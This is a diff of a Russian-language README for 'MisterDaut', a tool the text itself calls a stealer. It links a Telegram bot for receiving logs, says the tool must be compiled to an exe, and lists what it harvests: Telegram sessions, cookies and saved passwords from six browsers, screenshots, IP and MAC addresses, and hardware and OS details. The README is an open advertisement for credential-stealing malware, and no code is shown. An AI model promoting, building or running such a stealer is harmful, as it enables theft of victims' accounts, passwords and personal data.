@@ -1,5 +1,52 @@
 # MisterDaut
-![988357ded44c78d3a748e08af55661fc](https://github.com/aeshka1337/MisterDaut/assets/157249500/23a1d1e4-7055-40ec-8c0c-4ef6ce66cc6f)
+![19fa8e1c386e2602d693ed8e0d6f4b0f](https://github.com/aeshka1337/MisterDaut/assets/157249500/5f757c15-35a4-4c94-b8a7-75e78546a2f3)
 
-Mister Daut - вундервафля
-Bot: https://t.me/@isterdautbot
+
+Mister Daut - MQcorp 
+
+Бот для получения логов: https://t.me/@misterdautbot
+Необходимо компилировать в exe!
+
+Что себе позволяет:
+Телеграмм сессия
+
+Куки с Chrome
+
+Куки с Firefox
+
+Куки с Opera
+
+Куки с Yandex
+
+Куки с Amigo
+
+Куки с Edge
+
+Пароли с Chrome
+
+Пароли с Firefox
+
+Пароли с Opera
+
+Пароли с Yandex
+
+Пароли с Amigo
+
+Пароли с Edge
+
+Снимок экрана компьютера
+
+Информация о ПК
+
+Время запуска стиллера
+Имя пользователя/компьютера
+IP
+MAC адрес
+Hostname
+Информация о сетевых подключениях
+Найденные программы стиллером
+Информация о CPU
+Информация о GPU
+Информация о оперативной памяти
+Информация о дисках
+Информация об ОС
